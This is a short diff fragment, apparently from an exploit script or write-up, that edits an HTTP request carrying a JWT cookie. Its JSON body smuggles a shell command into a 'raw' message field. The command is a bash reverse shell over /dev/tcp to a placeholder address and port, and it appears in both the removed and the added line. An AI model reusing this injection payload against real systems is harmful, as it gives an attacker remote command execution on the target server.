@@ -58,5 +58,5 @@ Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwid
 Connection: close
 Content-Length: 81
 
-{"message":"{\"raw\":\";bash -c 'sh -i >& /dev/tcp/[ip]/[port] 0>&1;'\"}"}
+{"message": {"raw":";bash -c 'sh -i >& /dev/tcp/[ip]/[port] 0>&1;'"} }
 """
